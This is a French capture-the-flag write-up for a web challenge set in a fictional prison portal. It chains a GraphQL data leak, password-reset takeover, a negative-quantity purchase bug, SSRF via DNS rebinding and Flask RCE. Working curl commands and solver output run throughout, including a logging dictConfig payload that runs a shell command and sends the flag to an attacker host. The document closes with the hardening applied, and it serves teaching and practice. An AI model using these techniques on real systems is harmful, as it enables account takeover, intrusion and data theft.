# Writeup — Escape from "Prison de la Santé"

**Catégorie** : Web
**Difficulté** : Medium
**Points** : 500

---

## Description

Vous avez accès au portail intranet de la Prison de la Santé. L'objectif est de récupérer le flag stocké dans `/flag.txt` sur le serveur.

L'application est un portail pénitentiaire complet : gestion des détenus, parloir, infirmerie, boutique, marché noir, et un panel de direction accessible uniquement depuis l'intérieur du serveur (`127.0.0.1:5000`).

---

## Architecture

```
Internet
    |
    +-- :80 --> Nginx (React SPA + proxy /graphql /api)
                    |
                    +-- Node.js (Apollo Server + Express) :3000
                            |
                            | SSRF via DNS Rebinding
                            v
                        Flask (panel directeur) 127.0.0.1:5000
                            |
                            v
                        /flag.txt (root:root, 600)
                        /getflag  (setuid root, 4755)
```

Node.js et Flask tournent dans le même container via supervisord. Flask écoute exclusivement sur `127.0.0.1:5000`.

---

## Chaîne d'exploitation

1. **GraphQL BOLA** — Récupération de l'e-mail du gardien via une query publique
2. **Forgot Password** — Génération du token de réinitialisation en base
3. **GraphQL BOLA (bis)** — Lecture du token via le même chemin non protégé
4. **Reset Password** — Prise de contrôle du compte gardien
5. **Business Logic Bug** — Quantité négative en boutique pour gonfler le solde
6. **Marché noir** — Achat du tuyau qui révèle le code d'activation `FLUX-<hex>`
7. **SSRF + DNS Rebinding** — Accès à Flask sur `127.0.0.1:5000`
8. **RCE Flask** — `logging.config.dictConfig()` avec callable arbitraire

---

## Étape 1 — GraphQL BOLA : récupération de l'e-mail du gardien

### La vulnérabilité

Le portail expose une API GraphQL. Les queries `announcements` et `posts` sont publiques (accessibles sans authentification — elles servent aux familles des détenus).

Chacune résout le champ `author` vers un objet `User` complet via le resolver suivant (`resolvers/announcement.js`) :

```js
export const AnnouncementResolver = {
  author: async (parent, _, { db }) => {
    const result = await db.query(
      'SELECT * FROM users WHERE id = $1',
      [parent.author_id]
    );
    return result.rows[0];
  },
  // ...
};
```

Le `SELECT *` ramène toutes les colonnes de la table `users`, dont `token` (le token de réinitialisation de mot de passe). Il n'existe aucun field-level resolver de protection sur ce champ lorsqu'on passe par ce chemin. Les queries directes `user(id)` et `users` sont contrôlées (colonnes explicites sans `token`), mais pas le résolveur `author` des types publics.

### Exploitation

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ announcements { author { username email } } }"}' \
  | jq '.data.announcements[].author | select(.email != null)'
```

```json
{
  "username": "b.bellick",
  "email": "b.bellick@administration.penitentiaire-sante.fr"
}
```

---

## Étape 2 — Forgot Password : génération du token

### La route

Le backend expose `POST /api/auth/forgot-password`. Pour les comptes non-détenus (gardiens, directeur), un token aléatoire est généré et stocké en base de données (`routes/auth.js`) :

```js
router.post('/forgot-password', async (req, res) => {
  const { email } = req.body;
  // ...
  const result = await pool.query(
    'SELECT id, role FROM users WHERE email = $1', [email]
  );
  const account = result.rows[0];
  if (account && account.role !== 'inmate') {
    const token = crypto.randomBytes(20).toString('hex');
    const expires = new Date(Date.now() + 3600 * 1000);
    await pool.query(
      'UPDATE users SET token = $1, token_expires = $2 WHERE id = $3',
      [token, expires, account.id]
    );
    // Todo: Send email with reset link containing the token
  }
  return res.json({ success: true, message: "Si un compte est associé ..." });
});
```

L'envoi d'e-mail n'est pas implémenté. Le token est bien écrit en base mais jamais transmis à l'utilisateur légitime.

### Exploitation

```bash
curl -s -X POST http://<TARGET>/api/auth/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"email":"b.bellick@administration.penitentiaire-sante.fr"}' \
  | jq .
```

```json
{
  "success": true,
  "message": "Si un compte est associé à cette adresse, un lien de réinitialisation vous a été envoyé."
}
```

La réponse est identique qu'un compte existe ou non, mais le token vient d'être écrit dans la colonne `token` de la table `users` pour Bellick.

---

## Étape 3 — BOLA (bis) : lecture du token de réinitialisation

Maintenant que le token est en base, la même query publique le retourne directement :

```bash
curl -s -X POST http://<TARGET>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ announcements { author { username token } } }"}' \
  | jq '.data.announcements[].author | select(.token != null)'
```

```json
{
  "username": "b.bellick",
  "token": "a3f82e1d9c4b7e6f0a2d5c8b1e4f7a0d3c9e1b2f"
}
```

---

## Étape 4 — Reset Password : prise de contrôle du compte gardien

```bash
curl -s -X POST http://<TARGET>/api/auth/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"token":"a3f82e1d9c4b7e6f0a2d5c8b1e4f7a0d3c9e1b2f","newPassword":"hacked12345"}' \
  | jq .
```

```json
{"success": true, "message": "Mot de passe réinitialisé avec succès"}
```

```bash
curl -s -X POST http://<TARGET>/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"b.bellick","password":"hacked12345"}' \
  | jq '{token, role: .user.role}'
```

```json
{
  "token": "<JWT_BELLICK>",
  "role": "guard"
}
```

Cette première partie de la résolution est automatisée par le script [step1.py](./steps/step1.py):
```bash
$ python3 step1.py --target http://localhost
[*] Cible : http://localhost

[1/5] BOLA — récupération de l'e-mail du gardien via announcements
      Trouvé : b.bellick <b.bellick@administration.penitentiaire-sante.fr>
[2/5] Forgot-password → génération du token pour b.bellick@administration.penitentiaire-sante.fr
      Réponse : Si un compte est associé à cette adresse, un lien de réinitialisation vous a été envoyé.
[3/5] BOLA — lecture du token de réinitialisation via announcements
      Token : 2a1769e03f9e4f0b62e36dc2b18e090e414dfa68
[4/5] Reset du mot de passe avec le token
      Nouveau mot de passe : CTFsolve_2026!
[5/5] Connexion en tant que b.bellick
      JWT (gardien) : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OSw…

[+] Compte b.bellick compromis.
```


En naviguant sur le panel gardien, la page "Flux réglementaires" demande un code d'activation avant de permettre la soumission d'URL.

---

## Étape 5 — Business Logic Bug : quantité négative en boutique

### La vulnérabilité

La mutation `purchaseItems` ne valide pas que `quantity > 0`. Le total de la commande est calculé par simple multiplication (`resolvers/store.js`) :

```js
for (const item of items) {
  const storeItem = storeMap[item.itemId];
  if (storeItem.stock < item.quantity) throw new Error('Stock insuffisant');
  const subtotal = parseFloat(storeItem.price) * item.quantity;
  total += subtotal;
}

// ...

if (parseFloat(profile.rows[0].wallet_balance) < total) {
  throw new Error('Solde insuffisant');
}

// Débite le solde du montant total (négatif => crédit)
await db.query(
  'UPDATE inmate_profiles SET wallet_balance = wallet_balance - $1 WHERE user_id = $2',
  [total, user.id]
);
```

Avec `quantity = -200` et `price = 12.00` : `total = -2400`. Le solde augmente de 2 400 €. La vérification du solde compare `balance < -2400`, ce qui est faux pour n'importe quel solde positif — la commande passe.

### Exploitation

```bash
# Connexion en tant que détenu
JWT=$(curl -s -X POST http://<TARGET>/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"m.scofield","password":"FoxRiver1!"}' \
  | jq -r '.token')

# Récupérer un article disponible
ITEM_ID=$(curl -s -X POST http://<TARGET>/graphql \
  -H "Authorization: Bearer $JWT" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ storeItems { id name price } }"}' \
  | jq -r '.data.storeItems[0].id')

# Achat avec quantité négative
curl -s -X POST http://<TARGET>/graphql \
  -H "Authorization: Bearer $JWT" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":\"mutation { purchaseItems(items:[{itemId:\\\"$ITEM_ID\\\",quantity:-200}]) { total } }\"}" \
  | jq '.data.purchaseItems.total'
```

```
-2400
```

Le solde passe de 12 € à 2 412 €. Le tuyau coûte 1 800 €, une seule opération suffit.

---

## Étape 6 — Marché noir : obtention du code d'activation

### Pourquoi ce code existe

La feature "Flux réglementaires" du panel gardien est protégée par un code d'activation stocké en base de données (`service_config.flux_activation_code`), généré aléatoirement à l'initialisation. Il est impossible à deviner par bruteforce. Un seul moyen de l'obtenir : acheter le "Tuyau" au marché noir auprès de `c.westmoreland` (`resolvers/blackmarket.js`) :

```js
let successMessage = 'Transaction réussie. Réputation +5.';
if (!detected && revealCode) {
  const cfg = await db.query(
    "SELECT value FROM service_config WHERE key = 'flux_activation_code'"
  );
  const code = cfg.rows[0]?.value;
  if (code) {
    successMessage = `Transaction réussie. Réputation +5. Note confidentielle reçue : ${code}`;
  }
}
```

Le champ `reveals_activation_code` du `contraband_item` est `TRUE` uniquement pour le Tuyau. La transaction comporte un risque de détection de 10% (`risk_level = 10`).

### Exploitation

```bash
# Lister le marché noir
curl -s -X POST http://<TARGET>/graphql \
  -H "Authorization: Bearer $JWT" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ blackMarketListings { id price contrabandItem { name } seller { username } } }"}' \
  | jq '.data.blackMarketListings[] | select(.contrabandItem.name | test("Tuyau"))'
```

```json
{
  "id": "8",
  "price": 1800,
  "contrabandItem": {"name": "Tuyau — Accès service réglementaire"},
  "seller": {"username": "c.westmoreland"}
}
```

```bash
# Achat (relancer si détecté)
curl -s -X POST http://<TARGET>/graphql \
  -H "Authorization: Bearer $JWT" \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { buyFromBlackMarket(listingId:\"8\") { detected message } }"}' \
  | jq .
```

```json
{
  "data": {
    "buyFromBlackMarket": {
      "detected": false,
      "message": "Transaction réussie. Réputation +5. Note confidentielle reçue : FLUX-3f266b52d7b28c816d3023c5fb4a6655"
    }
  }
}
```

Le code `FLUX-3f266b52d7b28c816d3023c5fb4a6655` est unique par déploiement.

Cette seconde partie de la résolution est automatisée par le script [step2.py](./steps/step2.py):
```bash
[*] Cible : http://localhost

[1/3] Connexion en tant que m.scofield
      JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSw…
[2/3] Business Logic — gonflement du solde (objectif : 1850€)
      Solde initial : 2087.00€
      Solde suffisant, aucune action nécessaire
[3/3] Marché noir — achat du tuyau
      Annonce : Tuyau — Accès service réglementaire @ 1800€ (id=6, vendeur=c.westmoreland)
      Transaction réussie : Transaction réussie. Réputation +5. Note confidentielle reçue : FLUX-3f266b52d7b28c816d3023c5fb4a6655

[+] Code d'activation : FLUX-3f266b52d7b28c816d3023c5fb4a6655

[+] Utiliser ce code pour l'étape SSRF : FLUX-3f266b52d7b28c816d3023c5fb4a6655
```


---

## Étape 7 — SSRF via DNS Rebinding

### La vulnérabilité

Le resolver `fetchExternalFeed` effectue deux opérations réseau séquentielles sur la même URL (`resolvers/feed.js`) :

```js
// 1. Résolution DNS pour vérifier que l'IP n'est pas privée
const addresses = await dns.resolve4(hostname);
if (addresses.some(isPrivateAddress)) {
  return { success: false, error: 'Accès à cette source non autorisé' };
}

// 2. Requête HTTP réelle (nouvelle résolution DNS implicite)
const response = await fetch(feed.url, { signal: AbortSignal.timeout(8000) });
```

Le filtre et la requête utilisent deux résolutions DNS distinctes. Entre les deux, rien n'empêche le serveur DNS de retourner une IP différente. C'est une race condition TOCTOU (Time Of Check / Time Of Use) au niveau DNS.

### DNS Rebinding

Avec un serveur DNS dont le TTL est à 0, on configure un domaine pour qu'il retourne alternativement une IP publique puis `127.0.0.1` :

```
Appel 1 — dns.resolve4("rebind.attacker.com")  =>  1.2.3.4   (filtre OK)
Appel 2 — fetch("http://rebind.attacker.com/") =>  127.0.0.1 (atteint Flask)
```

Le service `1u.ms` fournit ce mécanisme gratuitement. Format du domaine :

```
make-<IP_PUBLIQUE>-rebind-127.0.0.1-rr.1u.ms
```

- Première résolution DNS → `<IP_PUBLIQUE>` : passe le filtre
- Deuxième résolution DNS → `127.0.0.1` : atteint Flask sur `:5000`

> Note : l'IP publique dans le domaine (`1.2.3.4`) sert uniquement à tromper le filtre DNS — ce n'est pas l'IP de l'attaquant. La cible du rebind est toujours `127.0.0.1` car c'est Flask que l'on veut atteindre.

### Gotcha — Cache du résolveur côté backend

Le résolveur DNS récursif utilisé par Node.js peut **mettre en cache** la première réponse pour un même nom : la seconde résolution (`dns.lookup` interne à `fetch`) renvoie alors la même IP que `dns.resolve4`, et l'alternance attendue ne se produit jamais. Symptôme : `fetch` tente la connexion sur l'IP publique (qui n'écoute rien côté backend) → `AbortSignal.timeout(8000)` → `TimeoutError`.

**Contournement** : un **préfixe aléatoire** différent à chaque tentative force un nom DNS neuf, donc une résolution non cachée. Côté `1u.ms`, l'alternance `rr` reprend à zéro pour chaque label : la 1ʳᵉ résolution renvoie l'IP publique (passe le filtre), la 2ᵉ renvoie `127.0.0.1` (atteint Flask).

```
{8-hex-aleatoire}.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms
```

C'est ce que fait [`solve.py`](./solve.py) (`secrets.token_hex(4)`), en ré-enregistrant un feed à chaque tentative.

### Enregistrement de la source piégée

```bash
PREFIX=$(openssl rand -hex 4)
FEED_URL="http://${PREFIX}.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms:5000/parametres/api/config/reload?url=http://192.168.16.1:1337/evil.json"

FEED_ID=$(curl -s -X POST http://<TARGET>/graphql \
  -H "Authorization: Bearer $JWT_BELLICK" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":\"mutation { addExternalFeed(name: \\\"Circulaires DAP\\\", url: \\\"$FEED_URL\\\", type: \\\"json\\\") { id } }\"}" \
  | jq -r '.data.addExternalFeed.id')
```

---

## Étape 8 — RCE Flask : logging.config.dictConfig()

### Pourquoi cette route est vulnérable

Le panel directeur Flask expose une route de rechargement de la configuration de logging (`routes/settings.py`) :

```python
@bp.get('/api/config/reload')
def reload_logging_config():
    source_url = request.args.get('url')
    with urllib.request.urlopen(source_url) as resp:
        config_data = json.loads(resp.read())
    logging.config.dictConfig(config_data)
    return jsonify({'status': 'reloaded', ...})
```

### Pourquoi dictConfig() permet une RCE

`logging.config.dictConfig()` est la fonction standard Python pour configurer le système de logging depuis un dictionnaire. Elle supporte une syntaxe spéciale pour instancier des classes arbitraires via la clé `()` :

```
"()": "dotted.path.to.Class"
```

Quand cette clé est présente, Python résout le chemin pointillé et appelle l'objet comme un constructeur avec les arguments fournis. `subprocess.Popen` est un callable Python standard accessible par ce chemin. La configuration suivante exécute une commande arbitraire au moment du rechargement :

```json
{
  "version": 1,
  "disable_existing_loggers": false,
  "handlers": {
    "exfil": {
      "()": "subprocess.Popen",
      "args": ["sh", "-c", "/getflag | base64 -w0 | curl -s http://172.27.0.1/flag?f=$(cat)"]
    }
  },
  "root": {
    "level": "DEBUG",
    "handlers": ["exfil"]
  }
}
```

`/getflag` est le binaire setuid root qui lit `/flag.txt`. Le processus Flask tourne en utilisateur non-privilégié et ne peut pas lire `/flag.txt` directement (permissions `root:root 600`). Le setuid permet au binaire de s'exécuter avec les droits root indépendamment de qui l'invoque.

### Chaîne complète

1. La SSRF atteint `127.0.0.1:5000/parametres/api/config/reload?url=http://172.27.0.1/evil.json`
2. Flask télécharge `evil.json` depuis le serveur de l'attaquant
3. `dictConfig()` instancie `subprocess.Popen` avec la commande d'exfiltration
4. `/getflag` lit `/flag.txt` grâce au setuid, le résultat est exfiltré en base64

### Déclenchement

```bash
# Via step3.py (login automatique avec le mot de passe défini à l'étape 1)
python3 step3.py --target http://<TARGET> --attacker 172.27.0.1 \
  --code FLUX-3a9f2e1c8b4d7a0e --port 1337

# Ou manuellement, répéter jusqu'au succès du rebinding
for i in $(seq 1 10); do
  curl -s -X POST http://<TARGET>/graphql \
    -H "Authorization: Bearer $JWT_BELLICK" \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"mutation { fetchExternalFeed(feedId:\\\"$FEED_ID\\\", activationCode:\\\"FLUX-3a9f2e1c8b4d7a0e\\\") { success statusCode error } }\"}" \
    | jq .
  sleep 1
done
```

### Réception du flag

```
FLAG: BZHCTF{LetMeOutOfHere}
```

Cette dernière partie de la résolution est automatisée par le script [step3.py](./steps/step3.py):
```bash
python3 step3.py --target http://localhost --attacker 172.27.0.1 --code FLUX-3f266b52d7b28c816d3023c5fb4a6655 --port 1337
[*] Cible        : http://localhost
[*] Attaquant    : 172.27.0.1:1337
[*] Code         : FLUX-3f266b52d7b28c816d3023c5fb4a6655

[0/3] Connexion en tant que b.bellick
      JWT obtenu : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OSw...

[*] Serveur HTTP en ecoute sur :1337
[1/3] SSRF — enregistrement de la source piegee
      Domaine rebind : make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms
      URL du feed    : http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms:5000/parametres/api/config/reload?url=http%3A%2F%2F172.27.0.1%3A1337%2Fevil.json
      Feed enregistre : id=5
[2/3] SSRF + DNS Rebinding — declenchement (jusqu'a 20 tentatives)
      Tentative 1/20...
      [HTTP] evil.json servi
success=True http=200 err=None

[+] FLAG recu : BZHCTF{LetMeOutOfHere}

============================================================
  FLAG : BZHCTF{LetMeOutOfHere}
============================================================
```

---

## Exploit complet en une commande

Les trois étapes sont enchaînées dans [solve.py](./solve.py) :

```bash
$ python3 solve.py --target http://escape-from-prison-de-la-sante-0.chall.ctf.bzh \
                   --attacker 192.168.16.1 --port 1337
[*] Cible     : http://escape-from-prison-de-la-sante-0.chall.ctf.bzh
[*] Attaquant : 192.168.16.1:1337

[ETAPE 1] ATO du compte gardien via GraphQL BOLA
  [1/5] BOLA — e-mail du gardien via announcements
         Trouve : b.bellick <b.bellick@administration.penitentiaire-sante.fr>
  [2/5] Forgot-password → generation du token pour b.bellick@administration.penitentiaire-sante.fr
  [3/5] BOLA — lecture du reset token via announcements
         Token : ca83de25f24d98623c4854bd592af39771112f08
  [4/5] Reset du mot de passe → CTFsolve_2026!
  [5/5] Connexion en tant que b.bellick
         JWT gardien : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OSw...
  [+] Compte b.bellick compromis

[ETAPE 2] Business Logic + Marche Noir → code d'activation FLUX
  [1/3] Connexion en tant que m.scofield
         JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSw...
  [2/3] Business Logic — gonflement du solde (actuel : 12.00€)
         Article choisi : Radio portable @ 25€
         Nouveau solde : 2087.00€
  [3/3] Marche noir — achat du tuyau
         Annonce : Tuyau — Accès service réglementaire @ 1800€ (id=6)
         Transaction reussie — code : FLUX-cfd0404c4b0a6e38485772a668fd3b64
  [+] Code FLUX obtenu : FLUX-cfd0404c4b0a6e38485772a668fd3b64

[ETAPE 3] SSRF via DNS Rebinding + RCE Flask
         Serveur HTTP en ecoute sur :1337
  [1/3] Strategie : nouveau feed avec prefixe aleatoire par tentative
  [2/3] Declenchement SSRF + rebinding (jusqu'a 30 tentatives)
         Prefixe aleatoire par tentative pour contourner le cache DNS
         Tentative 1/30 (04044e9b.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms)...          [HTTP] evil.json servi
success=True http=200 err=None

  [+] FLAG recu : BZHCTF{LetMeOutOfHere}

============================================================
  FLAG : BZHCTF{LetMeOutOfHere}
============================================================
```


---

## Défenses appliquées

Plusieurs durcissements ferment les chemins d'exploitation alternatifs et imposent le DNS rebinding comme seule voie pour atteindre Flask.

### 1. Blocage des redirections HTTP dans le resolver SSRF

On ne peut pas utiliser une redirection HTTP comme alternative au DNS rebinding. Le resolver `fetchExternalFeed` appelle `fetch()` avec `redirect: 'error'`, donc toute réponse 3xx fait lever une exception au lieu d'être suivie. Sans cette restriction, un attaquant peut enregistrer un feed pointant vers son propre serveur qui répond `302 Location: http://127.0.0.1:5000/...` : la première résolution DNS (filtre IP) voit l'IP publique, et le redirect suit sur `127.0.0.1` sans nouvelle vérification.

`src/backend/src/graphql/resolvers/feed.js` :

```js
const response = await fetch(feed.url, {
  signal: AbortSignal.timeout(8000),
  redirect: 'error',
  headers: {
    'Accept': 'application/json, application/xml, text/xml, */*',
    'X-Internal-Key': process.env.INTERNAL_API_KEY || '',
  },
});
```

### 2. Token interne entre Node.js et Flask

Le panel directeur n'a aucun appelant légitime côté navigateur, seul Node.js peut le contacter. Flask exige donc un en-tête partagé `X-Internal-Key` (la valeur de `INTERNAL_API_KEY`, déjà utilisée pour Flask vers Node.js) sur toutes les requêtes entrantes.

`src/director/app/__init__.py` :

```python
@app.before_request
def require_internal_key():
    expected = app.config.get('INTERNAL_API_KEY', '')
    provided = request.headers.get('X-Internal-Key', '')
    if not expected or provided != expected:
        abort(403)
```

On ne peut pas utiliser une **CSRF navigateur** (`<form>` GET, `<iframe>`, `window.open()`) pour atteindre Flask : un navigateur ne sait pas poser un en-tête custom cross-origin sans preflight CORS, donc Flask renvoie 403. Le seul appelant qui fournit le token est Node.js depuis le serveur, ce qui force l'attaquant à passer par le SSRF + DNS rebinding.

### 3. Anti-iframe et clickjacking (defense in depth)

`X-Frame-Options: DENY` et `Content-Security-Policy: frame-ancestors 'none'` sont posés sur :

- `src/frontend/nginx.conf` (réponses publiques)
- `src/backend/src/index.js` (Express middleware)
- `src/director/app/__init__.py` (Flask `after_request`)

### Récapitulatif des chemins après durcissement

| Chemin | Avant | Après |
|---|---|---|
| Bypass via redirect HTTP | ouvert | bloqué par `redirect: 'error'` |
| CSRF navigateur (form, iframe, open) | ouvert | bloquée, header custom requis |
| Iframe et clickjacking | ouvert | bloqué par XFO et CSP |
| DNS rebinding via `fetchExternalFeed` | ouvert | chemin attendu, Node.js pose le token |
